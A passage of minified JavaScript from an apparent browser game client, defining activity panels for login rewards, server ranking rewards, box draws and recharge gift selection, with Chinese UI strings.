eui.ArrayCollection(a[r].rewards),this.addTouchEvent(this["day"+r],this.onTouch),this["bg"+r].source=(null===(e=a[r])||void 0===e?void 0:e.unclaimedimg)||"";Timer.start(1e3,-1,this.setTime,this),this.updateData();var h=l.Activity.ins().getbtnInfo(this.activityID);(null===h||void 0===h?void 0:h.titleImg)&&(this.actTitle.source=null===h||void 0===h?void 0:h.titleImg),(null===h||void 0===h?void 0:h.bgImg)&&(this.bg00.source=null===h||void 0===h?void 0:h.bgImg),(null===h||void 0===h?void 0:h.bannerImg)&&(this.acbanner.source=null===h||void 0===h?void 0:h.bannerImg)},e.prototype.removeDisplay=function(){if(this.skin){this.removeObserve();for(var t=1;t<=this.maxDay;t++)this.removeTouchEvent(this["day"+t],this.onTouch),this["list"+t].dataProvider=new eui.ArrayCollection([]);
Timer.stopAll(this),this.maxDay=0}},e.prototype.updateData=function(){this.setTime();var t=1;t=this._activityData.getCurDay(),this.daylabel.text=gettext("登陆天数：{0}",t);for(var e=1;e<=this.maxDay;e++){var i=1==(this._activityData.recrod>>e&1);t>=e?(this["noGet"+e].visible=!1,i?(this["had"+e].visible=!0,this["redPoint"+e].visible=!1):(this["had"+e].visible=!1,this["redPoint"+e].visible=!0)):(this["had"+e].visible=!1,this["noGet"+e].visible=!0,this["redPoint"+e].visible=!1)}},e.prototype.setTime=function(){var t=Math.floor((n.DateUtils.formatMiniDateTime(this._activityData.startTime)-a.GameServerCC.serverTime)/1e3),e=Math.floor((n.DateUtils.formatMiniDateTime(this._activityData.endTime)-a.GameServerCC.serverTime)/1e3);t>=0?this.actTime0.text=gettext("活动未开启"):0>=e?this.actTime0.text=gettext("活动已结束"):this.actTime0.text=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_5,3)},e.prototype.onTouch=function(t){switch(t.currentTarget){case this.day1:this.day=1;break;case this.day2:this.day=2;break;case this.day3:this.day=3;break;case this.day4:this.day=4;break;case this.day5:this.day=5;break;case this.day6:this.day=6;break;case this.day7:this.day=7}this._activityData.getCurDay()>=this.day?l.Activity.ins().sendReward(this.activityID,this.day):r.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:登陆天数不足，无法领取|"))},e.prototype.tabRp=function(){var t=l.Activity.ins().activityData[this.activityID],e=t.canReward();return e},e}(h.ActivityPanel);e.OSATarget5Panel5=u,window.OSATarget5Panel5=u,__reflect(u.prototype,"OSATarget5Panel5",[]),window.OSATarget5Panel5=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget60Panel=void 0;var n=i(29),o=i(9),s=i(0),a=i(576),r=i(5),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa60pskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=a.OSATarget60Item,this.eList.dataProvider=this.listDP=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.changePage,o.Activity.ins().postActivityIsGetAwards,o.Activity.ins().postChangePage),o.Activity.ins().sendChangePage(this.activityID);var i=s.GlobalConfig.ActivityConfig[this.activityID];this.eDesc.textFlow=r.TextFlowMaker.generateTextFlow1(""+i.desc),this.updateList()},e.prototype.changePage=function(t){this.activityID==t&&this.updateList()},e.prototype.updateList=function(){var t=[],e=[],i=[],n=[],a=s.GlobalConfig.ActivityType60Config[this.activityID],r=o.Activity.ins().getActivityDataById(this.activityID);for(var l in a){var h=a[l].index,u=r.info[h];u&&1==u.state?t.push(a[l]):u&&0==u.state&&u.count?e.push(a[l]):u.count?u&&2==u.state&&n.push(a[l]):i.push(a[l])}var p=t.concat(e,i,n);this.listDP.replaceAll(p)},e}(n.ActivityPanel);e.OSATarget60Panel=l,window.OSATarget60Panel=l,__reflect(l.prototype,"OSATarget60Panel",[]),window.OSATarget60Panel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0});var n=i(18),o=i(8),s=i(42),a=i(0),r=i(6),l=i(7),h=i(2),u=i(9),p=i(29),d=i(577),c=i(578),f=i(238),g=i(580),m=i(582),v=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa62p1skin",e._auto=!1,e._time=null,e._waitTime=.5,e}return __extends(e,t),e.prototype.skinComplete=function(){this.lists.itemRenderer=d.Act62RewardItem,this.lists.dataProvider=this._listData=new eui.ArrayCollection},e.prototype.removeDisplay=function(){this._auto=!1,Timer.stop(this.updateTime,this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.actData=u.Activity.ins().getActivityDataById(this.activityID),this.lists.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.btnHouse.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.btnReward.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.btnGuider.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.item3.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.eCK.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),this.rate.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),observe(this,this.updateData,u.Activity.ins().postActivityIsGetAwards),observe(this,this.doEff,u.Activity.ins().postActivityIsGetAwards),observe(this,this.updataItem,r.BagCT.ins().postItemChange),observe(this,this.updataItem,r.BagCT.ins().postItemAdd),observe(this,this.updataItem,r.BagCT.ins().postItemDel),this.observe(this.actData.reStart,this.reStart),this.updataItem(),this.updateData(),this.doTime()},e.prototype.doEff=function(){var t=this;this.updateData();var e=this.actData.openIndexs,i=(this.lists,this.btnHouse.x),n=this.btnHouse.y;e.forEach(function(e){var o=t.actData.boxs[e],s=new d.Act62RewardItem;s.data=o;var a=t.lists.getChildAt(e),r=a.x+t.lists.x,l=a.y+t.lists.y;s.x=r,s.y=l,s.touchEnabled=!1,t.addChild(s),egret.Tween.get(s).to({x:i,y:n},1e3,egret.Ease.sineInOut).call(function(){egret.Tween.removeTweens(s),t.removeChild(s)})})},e.prototype.reStart=function(){this.updateData(),this._auto=!1,this.eCK.selected=this._auto,Timer.stop(this.updateTime,this)},e.prototype.updateData=function(){this.actData=u.Activity.ins().getActivityDataById(this.activityID);var t=a.GlobalConfig.ActivityType62Config[this.activityID][this.actData.curLayer];this.level.text=this.actData.curLayer.toString(),t.bigReward[this.actData.select-1]?(this.item3.data=t.bigReward[this.actData.select-1],this.select.visible=!1):(this.item3.clear(),this.item3.clearIcon(),this.select.visible=!0);var e=t.rnt[0],i=a.GlobalConfig.ItemConfig[e.id];this.costIcon.source=RES_DIR_ITEMICON+(i.icon+".png"),this._listData.source=this.actData.boxs},e.prototype.updataItem=function(){var t=a.GlobalConfig.ActivityType62Config[this.activityID][this.actData.curLayer],e=t.rnt[0],i=r.BagCT.ins().getBagItemCount(r.BagCT.BAG_TYPE_OTHTER,e.id),o=i+"/"+e.count,l=i>=e.count?n.ColorUtil.GREEN:n.ColorUtil.RED;this.lbNum.textFlow=HtmlUtil.parse(s.StringUtils.addColor(""+o,l))},e.prototype.onClick=function(t){a.GlobalConfig.ActivityType62Config[this.activityID][this.actData.curLayer];switch(t.currentTarget){case this.btnHouse:win.open(f.Act62HouseWin,this.activityID);break;case this.btnReward:win.open(m.Act62RewardWin,this.activityID,this.actData.curLayer);break;case this.btnGuider:break;case this.item3:if(this.actData.select)return;win.open(c.Act62GoodWin,this.actData);break;case this.eCK:if(this.actData.select<1)return this.eCK.selected=!1,void h.TipsCT.ins().showTips(gettext("请先选择大奖！"));this._time=this._waitTime,this._auto=!this._auto,this._auto?Timer.start(1e3,0,this.updateTime,this):Timer.stop(this.updateTime,this);break;case this.rate:win.open(g.Act62PreviewWin,this.actData.id,this.actData.curLayer)}},e.prototype.onItemClick=function(t){var e=t.currentTarget,i=a.GlobalConfig.ActivityType62Config[this.activityID][this.actData.curLayer];if(r.BagCT.ins().isConsumeEnough(i.rnt,r.BagCT.BAG_TYPE_OTHTER,!0)){var n=e.selectedIndex,o=e.getChildAt(n);o&&o.isOpen||u.Activity.ins().sendReward(this.actData.id,2,e.selectedIndex+1)}},e.prototype.doTime=function(){var t=this.actData.endTime-l.GameServerCC.serverTime,e="";t>0&&(e=s.StringUtils.addColor(o.DateUtils.getFormatTimeByStyle(t,o.DateUtils.STYLE_1),n.ColorUtil.GREEN)),this.actTime.textFlow=HtmlUtil.parse(e)},e.prototype.updateTime=function(){if(this.doTime(),this._auto&&(this._time--,this._time<0)){this._time=this._waitTime;var t=a.GlobalConfig.ActivityType62Config[this.activityID][this.actData.curLayer];if(!r.BagCT.ins().isConsumeEnough(t.rnt,r.BagCT.BAG_TYPE_OTHTER,!0))return this._auto=!1,void(this.eCK.selected=this._auto);this.doAuto()}},e.prototype.doAuto=function(){for(var t=this.lists.numElements,e=[],i=0;t>i;i++){var n=this.lists.getElementAt(i);n&&!n.isOpen&&e.push(n.itemIndex+1)}if(e.length>0){var o=Math.floor(Math.random()*e.length);u.Activity.ins().sendReward(this.actData.id,2,e[o])}},e}(p.ActivityPanel);window.OSATarget62Panel=v,__reflect(v.prototype,"OSATarget62Panel",[]),window.OSATarget62Panel=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget64Item1=void 0;var n=i(3),o=i(9),s=i(11),a=i(5),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._canGot=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.skinName="KaiFuChongBangRW"},e.prototype.dataChanged=function(){if(this.data&&this.skin){this._canGot=!1,this.addTouchEvent(this.get1,this.onClickHandler),this.rewardList0.itemRenderer=s.ItemBase,this.rewardList0.dataProvider=this._awardArr=new eui.ArrayCollection;var t=this.data.cfg;this._cfg=t,this.desc.textFlow=a.TextFlowMaker.generateTextFlow(t.taskDscribe),this._awardArr.source=t.rewards;var e=o.Activity.ins().getActivityDataById(this.data.actId);this.get1.label=gettext("领取"),e&&(this.lab.text=(e.openServerRank.curScore||0)+"/"+t.taskCondition,this.get1.label=(e.openServerRank.curScore||0)>=t.taskCondition?gettext("领取"):gettext("未完成"),this.getGro.visible=1!=e.rewardInfo[this._cfg.index],this.already.visible=!this.getGro.visible,this._canGot=1!=e.rewardInfo[this._cfg.index]&&e.openServerRank.curScore>=t.taskCondition,this.get1.eRp.visible=this._canGot)}},e.prototype.onClickHandler=function(t){switch(t.target){case this.get1:if(!this._canGot)return;o.Activity.ins().sendReward(this.data.actId,this._cfg.index,1)}},e}(n.BaseItemRender);e.OSATarget64Item1=r,window.OSATarget64Item1=r,__reflect(r.prototype,"OSATarget64Item1",[]),window.OSATarget64Item1=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget64Panel1=void 0;var n=i(42),o=i(0),s=i(13),a=i(26),r=i(9),l=i(29),h=i(583),u=i(584),p=function(t){function e(){var e=t.call(this)||this;return e._sn_="KaiFuChongBangSkin",e._selType=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.list1.itemRenderer=h.OSATarget64Item2,this.list1.dataProvider=this.dataArr1=new eui.ArrayCollection([]),this.addTouchEvent(this.paiMingBtn,this.onClickHandler)},e.prototype.onClickHandler=function(t){switch(t.currentTarget){case this.paiMingBtn:win.open(u.OpenServerRankView,this.activityID)}},e.prototype.flusTabViewInfo=function(t){var e,i;if(this._selType=t,r.Activity.ins().act64SelType=t,0==this._selType)this.scr1.visible=!1,this.dataArr.replaceAll(this.getDataArr(this._selType).concat([]));else{this.rank1.visible=this.rank2.visible=this.rank3.visible=!1;var n=r.Activity.ins().getActivityDataById(this.activityID);if(n){var o=null===(i=null===(e=n)||void 0===e?void 0:e.openServerRank)||void 0===i?void 0:i.rankList;if(o&&o.length>0)for(var s in o)switch(o[s].rank){case 1:this.rank1.visible=!0,this.rank1.data=o[s];break;case 2:this.rank2.visible=!0,this.rank2.data=o[s];break;case 3:this.rank3.visible=!0,this.rank3.data=o[s]}}this.scr1.visible=!0,this.dataArr1.replaceAll(this.getDataArr(this._selType).concat([]))}},e.prototype.getDataArr=function(t){var e,i,n=o.GlobalConfig.ActivityType64Config[this.activityID],s=[],a=!1,l=r.Activity.ins().getActivityDataById(this.activityID),h=null===(i=null===(e=l)||void 0===e?void 0:e.openServerRank)||void 0===i?void 0:i.rankList;if(h&&h.length>3){for(var u=0;u<h.length;u++){if(3>u){var p=n[u+1],d=r.Activity.ins().getActivityDataById(this.activityID);s.push({cfg:p,actId:this.activityID,canGot:!1,actData:d,status:0})}else{var p=n[4],d=r.Activity.ins().getActivityDataById(this.activityID);s.push({cfg:p,actId:this.activityID,canGot:!1,actData:d,status:0})}if(u>=20)break}if(h.length<20){var p=n[4],d=r.Activity.ins().getActivityDataById(this.activityID);s.push({cfg:p,actId:this.activityID,canGot:!1,actData:d,status:0})}}else for(var c in n){var p=n[c];if(0==t){if(a=!0,1!=p.showType){var f=r.Activity.ins().getActivityDataById(this.activityID),g=f&&1!=f.rewardInfo[p.index]&&f.openServerRank.curScore>=p.taskCondition,m=1;1==f.rewardInfo[p.index]?m=0:f.openServerRank.curScore>=p.taskCondition&&(m=2),s.push({cfg:p,actId:this.activityID,canGot:g,actData:f,status:m})}}else if(1==t&&1==p.showType){var d=r.Activity.ins().getActivityDataById(this.activityID);s.push({cfg:p,actId:this.activityID,canGot:!1,actData:d,status:0})}}return a&&(s=s.sort(function(t,e){return t.status==e.status?t.cfg.index-e.cfg.index:e.status-t.status})),s},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.flusTabViewInfo(r.Activity.ins().act64SelType||0),this.updateView();var i=o.GlobalConfig.ActivityConfig[this.activityID];this.info.text=(null===i||void 0===i?void 0:i.desc)||"",r.Activity.ins().reqOpenServerRankInfo(this.activityID)},e.prototype.updateView=function(){var t=o.GlobalConfig.ActivityType64Config[this.activityID][1],e=r.Activity.ins().activityData[this.activityID];this.rank.text=-1==e.openServerRank.myRank?gettext("未上榜"):e.openServerRank.myRank+"",this.xinxi.text=this.getScoreDescByType(t.rankingListType,e.openServerRank.curScore),this.decs.text=t.personShowType,0==this._selType?this.dataArr.replaceAll(this.getDataArr(this._selType).concat([])):this.dataArr1.replaceAll(this.getDataArr(this._selType).concat([]))},e.prototype.getScoreDescByType=function(t,e){var i="";switch(t){case 3:var r=a.ZsCT.ins().lv;if(r>=110){var l=r%110;i+=gettext("{0}转{1}级",Math.floor(l/11),l%11)}else i+=gettext("{0}转{1}级",a.ZsCT.ins().stage,r%11);break;case 6:var h=s.SubRoles.ins().getSubRoleByIndex(0).jingMaiData,u=o.GlobalConfig.JingMaiStageConfig[h.stage];u&&(i+=gettext("{0}阶·{1}",n.StringUtils.NumberToChinese(u.level),u.name));break;default:i+=e}return i},e.prototype.removeDisplay=function(){},e.prototype.tabRp=function(){var t=r.Activity.ins().activityData[this.activityID];return t.rp.v},e}(l.ActivityPanel);e.OSATarget64Panel1=p,window.OSATarget64Panel1=p,__reflect(p.prototype,"OSATarget64Panel1",[]),window.OSATarget64Panel1=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget64RoleItem=void 0;var n=i(3),o=i(0),s=i(10),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="teamFbRoleItem",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.dataChanged(),this.grpPower.visible=!0,this.position.visible=!1},e.prototype.dataChanged=function(){var t;this.skin&&(this._memberVo=this.data,this.rolegroup.visible=!0,this.showRole(this._memberVo),this.grpPower.visible=!0,this.ePow.text=((null===(t=this._memberVo)||void 0===t?void 0:t.power)||0)+"")},e.prototype.showRole=function(t){if(t&&(this.eIcon.source="yuanhead"+t.job+"1",this.lb_lv.text=t.lv+"",this.eNameLab.text=t.playerName,this.eTitleGrp.visible=!!t.outWard,this.eTitleGrp.visible)){var e=o.GlobalConfig.TitleConf[t.outWard];this.eTitle.text=null===e||void 0===e?void 0:e.name,this.eTitle.textColor=s.ItemUtil.getQualityColor((null===e||void 0===e?void 0:e.rare)||0),this.updateTitleEff(e)}},e.prototype.updateTitleEff=function(t){return(null===t||void 0===t?void 0:t.eff)?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e}(n.BaseItemRender);e.OSATarget64RoleItem=a,window.OSATarget64RoleItem=a,__reflect(a.prototype,"OSATarget64RoleItem",[]),window.OSATarget64RoleItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget65Panel=void 0;var n=i(29),o=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="osa65p1skin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e]},e}(n.ActivityPanel);e.OSATarget65Panel=o,window.OSATarget65Panel=o,__reflect(o.prototype,"OSATarget65Panel",[]),window.OSATarget65Panel=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget70ItemItem=e.OSATarget70Item=e.OSATarget70Panel=void 0;var n=i(3),o=i(0),s=i(6),a=i(197),r=i(2),l=i(9),h=i(29),u=i(271),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="OSA70PanelSkin",e.actList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=d,this.eList.dataProvider=this.listAc=new eui.ArrayCollection([]);var t=o.GlobalConfig.ActivityBtnConfig[this.activityID];this.tittle.source=t.titleImg,this.topImg.source=t.bgImg},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateViewList,l.Activity.ins().postRewardResult,l.Activity.ins().postChangePage),this.updateView()},e.prototype.updateViewList=function(){for(var t,e=l.Activity.ins().activityData[this.activityID],i=0;i<this.eList.numElements;i++){var n=this.eList.getElementAt(i);if(n){var o=e.getAchieveInfo(n.data.index),s={activityID:this.activityID,index:n.data.index,type:n.data.type,getCount:null===o||void 0===o?void 0:o.getCount,val:n.data.val,rewards:n.data.rewards,hasArr:o.hasArr,hasGetCount:o.hasGetCount,max:n.data.max||1};(null===(t=n.data)||void 0===t?void 0:t.getCount)!=(null===o||void 0===o?void 0:o.getCount)&&this.listAc.replaceItemAt(s,i)}}},e.prototype.updateView=function(){var t=[],e=o.GlobalConfig.ActivityType70Config[this.activityID],i=l.Activity.ins().activityData[this.activityID];for(var n in e){var s=e[n],a=i.getAchieveInfo(s.index);t.push({activityID:this.activityID,index:s.index,type:s.type,getCount:null===a||void 0===a?void 0:a.getCount,val:s.val,rewards:s.rewards,hasArr:a.hasArr,hasGetCount:a.hasGetCount,max:s.max||1,jump:s.jump})}this.listAc.replaceAll(t)},e.prototype.tabRp=function(){var t=l.Activity.ins().activityData[this.activityID];return t.rp.v},e}(h.ActivityPanel);e.OSATarget70Panel=p,window.OSATarget70Panel=p,__reflect(p.prototype,"OSATarget70Panel",[]);var d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.sendGetGain=[],e}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.eBtn,this.onClick)},e.prototype.dataChanged=function(){switch(this.data.type){case 1:this.currentState="single";break;case 2:this.currentState="accumulate"}this.validateNow(),this.eList.itemRenderer=c;var t=[],e=this.data.rewards;switch(this.data.type){case 1:if(e)for(var i in e)t.push({type:1,getCount:this.data.getCount,das:e[i],index:this.data.index-1});this.eList.dataProvider=this.listAc=new eui.ArrayCollection(t),this.num.text=gettext("领取次数（{0}/{1}）",this.data.hasGetCount,this.data.max);break;case 2:if(e)for(var i in e)t.push({type:2,getCount:this.data.getCount,das:e[i],index:this.data.index-1});this.eList.dataProvider=this.listAc=new eui.ArrayCollection(t)}observe(this,this.updateItems,l.Activity.ins().update70PanelAct),this.addItemsByType(),this.setDatas()},e.prototype.addItemsByType=function(){var t=this.data.rewards,e=o.GlobalConfig.OptionalGiftConfig;if(t)for(var i=0;i<t.length;i++)0==t[i].type?this.sendGetGain[i]=100:e[t[i].id]?this.sendGetGain[i]=-1:this.sendGetGain[i]=100},e.prototype.updateItems=function(){if(this.data){var t=l.Activity.ins().returnAct70Indx;t.idx==this.itemIndex&&(this.sendGetGain[t.lisIdx]=t.value)}},e.prototype.setDatas=function(){this.eGet.visible=!1,this.data.getCount>0?this.eBtn.label=gettext("可领取"):this.data.hasGetCount!=this.data.max&&0==this.data.getCount?this.eBtn.label=gettext("前往充值"):(this.eBtn.visible=!1,this.eGet.visible=!0);var t=l.Activity.ins().activityData[this.data.activityID];if(2==this.data.type?this.eDay.text=gettext("{0}/{1}元宝",t.money,this.data.val||0):this.eDay.text=gettext("{0}元宝",this.data.val||0),this.redpoint.visible=this.data.getCount?this.data.getCount>0:!1,this.data.hasArr.length>0){var e=[];for(var i in this.data.hasArr){var n=void 0;if(this.data.rewards[i])if(n=this.data.rewards[i].id,this.data.hasArr[i]>0&&this.data.hasArr[i]<100){var o=this.data.hasArr[i];o-=1;var s=l.Activity.ins().return70DataByValue(n,o),a={type:3,das:s};e.push(a)}else if(this.data.hasArr[i]>=100){var a={type:3,das:this.data.rewards[i]};e.push(a)}}this.listAc.replaceAll(e),this.listAc.refresh()}},e.prototype.onClick=function(){if(this.data.getCount>0){if(this.data.hasArr>0)return void r.TipsCT.ins().showTips(gettext("已领取物品"));if(!this.judgeArrHasSlect())return void r.TipsCT.ins().showTips(gettext("请选择物品"));var t=l.Activity.ins().return70NumByValue(this.data.rewards,this.sendGetGain),e=s.BagCT.ins().rockonNeedNum(t);if(e&&s.BagCT.ins().getAllSurplusCount(e)<0)return void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));var i=this.AddMoreValue();l.Activity.ins().sendReward(this.data.activityID,this.data.index,0,i)}else if(this.data.hasGetCount!=this.data.max&&0==this.data.getCount)switch(this.data.type){case 1:this.data.jump&&win.open(this.data.jump);break;case 2:win.open(a.RechargeShowWin)}},e.prototype.judgeArrHasSlect=function(){for(var t=!0,e=this.sendGetGain.length,i=0;e>i;i++)-1==this.sendGetGain[i]&&(t=!1);return t},e.prototype.AddMoreValue=function(){for(var t in this.sendGetGain)this.sendGetGain[t]++;var e=this.bytesToInt(this.sendGetGain);return e},e.prototype.bytesToInt=function(t){for(var e=0,i=0;i<t.length;i++)e|=t[i]<<8*i;return e},e.prototype.clearAll=function(){},e}(n.BaseItemRender);e.OSATarget70Item=d,window.OSATarget70Item=d,__reflect(d.prototype,"OSATarget70Item",[]);var c=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.setDatas()},e.prototype.setDatas=function(){var t,e,i,n,s;if(this.data)if((null===(t=this.data)||void 0===t?void 0:t.das)&&0==this.data.das.type)this.item.data=this.data.das,this.add.visible=!1,this.touchChildren=!0,this.touchEnabled=!0;else if(2==(null===(e=this.data)||void 0===e?void 0:e.type)||1==(null===(i=this.data)||void 0===i?void 0:i.type)){var a=o.GlobalConfig.OptionalGiftConfig[null===(s=null===(n=this.data)||void 0===n?void 0:n.das)||void 0===s?void 0:s.id];a?(this.item.visible=!1,this.add.visible=!0,observe(this,this.updateItems,l.Activity.ins().update70PanelAct),this.addTouchEvent(this,this.openItem),this.data.getCount>0?(this.touchChildren=!1,this.touchEnabled=!0):(this.touchChildren=!0,this.touchEnabled=!0)):(this.add.visible=!1,this.item.visible=!0,this.item.data=this.data.das,this.touchChildren=!0,this.touchEnabled=!0)}else this.add.visible=!1,this.item.visible=!0,this.item.data=this.data.das,this.touchChildren=!0,this.touchEnabled=!0},e.prototype.updateItems=function(){var t,e;if(this.data&&(2==(null===(t=this.data)||void 0===t?void 0:t.type)||1==(null===(e=this.data)||void 0===e?void 0:e.type))){var i=l.Activity.ins().returnAct70Indx;if(i.idx==this.data.index&&i.lisIdx==this.itemIndex){var n=l.Activity.ins().return70DataByValue(this.data.das.id,i.value);this.item.visible=!0,this.add.visible=!1,this.item.data=n}}},e.prototype.openItem=function(){var t,e;!this.data||2!=(null===(t=this.data)||void 0===t?void 0:t.type)&&1!=(null===(e=this.data)||void 0===e?void 0:e.type)||win.open(u.OpSelectItemPanel,this.data.das.id,this.data.index,this.itemIndex,70)},e}(n.BaseItemRender);e.OSATarget70ItemItem=c,window.OSATarget70ItemItem=c,__reflect(c.prototype,"OSATarget70ItemItem",[]),window.OSATarget70ItemItem=c,window.OSATarget70Item=d,window.OSATarget70Panel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.OSATarget71ItemItem=e.OSATarget71Item=e.OSATarget71Panel=void 0;var n=i(3),o=i(0),s=i(6),a=i(197),r=i(2),l=i(9),h=i(29),u=i(271),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="OSA71PanelSkin",e.actList=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=d,this.eList.dataProvider=this.listAc=new eui.ArrayCollection([]);var t=o.GlobalConfig.ActivityBtnConfig[this.activityID];this.tittle.source=t.titleImg,this.topImg.source=t.bgImg},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateViewList,l.Activity.ins().postRewardResult,l.Activity.ins().postChangePage),this.updateView()},e.prototype.updateViewList=function(){for(var t,e=l.Activity.ins().activityData[this.activityID],i=0;i<this.eList.numElements;i++){var n=this.eList.getElementAt(i);if(n){var o=e.getAchieveInfo(n.data.index),s={activityID:this.activityID,index:n.data.index,type:n.data.type,getCount:null===o||void 0===o?void 0:o.getCount,val:n.data.val,rewards:n.data.rewards,hasArr:o.hasArr,hasGetCount:o.hasGetCount,max:n.data.max||1,yuanbao:o.yuanbao||0};(null===(t=n.data)||void 0===t?void 0:t.getCount)!=(null===o||void 0===o?void 0:o.getCount)&&this.listAc.replaceItemAt(s,i)}}},e.prototype.updateView=function(){var t=[],e=o.GlobalConfig.ActivityType71Config[this.activityID],i=l.Activity.ins().activityData[this.activityID];for(var n in e){var s=e[n],a=i.getAchieveInfo(s.index);t.push({activityID:this.activityID,index:s.index,type:s.type,getCount:null===a||void 0===a?void 0:a.getCount,val:s.val,rewards:s.rewards,hasArr:a.hasArr,hasGetCount:a.hasGetCount,max:s.max||1,jump:s.jump,yuanbao:a.yuanbao})}this.listAc.replaceAll(t)},e.prototype.tabRp=function(){var t=l.Activity.ins().activityData[this.activityID];return t.rp.v},e}(h.ActivityPanel);e.OSATarget71Panel=p,window.OSATarget71Panel=p,__reflect(p.prototype,"OSATarget71Panel",[]);var d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.sendGetGain=[],e}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.eBtn,this.onClick)},e.prototype.dataChanged=function(){switch(this.data.type){case 1:this.currentState="single";break;case 2:this.currentState="accumulate"}this.validateNow(),this.eList.itemRenderer=c;var t=[],e=this.data.rewards;switch(this.data.type){case 1:if(e)for(var i in e)t.push({type:1,getCount:this.data.getCount,das:e[i],index:this.data.index-1});this.eList.dataProvider=this.listAc=new eui.ArrayCollection(t),this.num.text=gettext("领取次数（{0}/{1}）",this.data.hasGetCount,this.data.max);break;case 2:if(e)for(var i in e)t.push({type:2,getCount:this.data.getCount,das:e[i],index:this.data.index-1});this.eList.dataProvider=this.listAc=new eui.ArrayCollection(t)}observe(this,this.updateItems,l.Activity.ins().update71PanelAct),this.addItemsByType(),this.setDatas()},e.prototype.addItemsByType=function(){var t=this.data.rewards,e=o.GlobalConfig.OptionalGiftConfig;if(t)for(var i=0;i<t.length;i++)0==t[i].type?this.sendGetGain[i]=100:e[t[i].id]?this.sendGetGain[i]=-1:this.sendGetGain[i]=100},e.prototype.updateItems=function(){if(this.data){var t=l.Activity.ins().returnAct71Indx;t.idx==this.itemIndex&&(this.sendGetGain[t.lisIdx]=t.value)}},e.prototype.setDatas=function(){if(this.eGet.visible=!1,this.data.getCount>0?this.eBtn.label=gettext("可领取"):this.data.hasGetCount!=this.data.max&&0==this.data.getCount?this.eBtn.label=gettext("前往充值"):(this.eBtn.visible=!1,this.eGet.visible=!0),this.eDay.text=gettext("{0}/{1}元宝",this.data.yuanbao,this.data.val||0),this.redpoint.visible=this.data.getCount?this.data.getCount>0:!1,this.data.hasArr.length>0){var t=[];for(var e in this.data.hasArr){var i=void 0;if(this.data.rewards[e])if(i=this.data.rewards[e].id,this.data.hasArr[e]>0&&this.data.hasArr[e]<100){var n=this.data.hasArr[e];n-=1;var o=l.Activity.ins().return71DataByValue(i,n),s={type:3,das:o};t.push(s)}else if(this.data.hasArr[e]>=100){var s={type:3,das:this.data.rewards[e]};t.push(s)}}this.listAc.replaceAll(t),this.listAc.refresh()}},e.prototype.onClick=function(){if(this.data.getCount>0){if(this.data.hasArr>0)return void r.TipsCT.ins().showTips(gettext("已领取物品"));if(!this.judgeArrHasSlect())return void r.TipsCT.ins().showTips(gettext("请选择物品"));var t=l.Activity.ins().return71NumByValue(this.data.rewards,this.sendGetGain),e=s.BagCT.ins().rockonNeedNum(t);if(e&&s.BagCT.ins().getAllSurplusCount(e)<0)return void r.TipsCT.ins().showTips(gettext("背包剩余空间不足，请扩容"));var 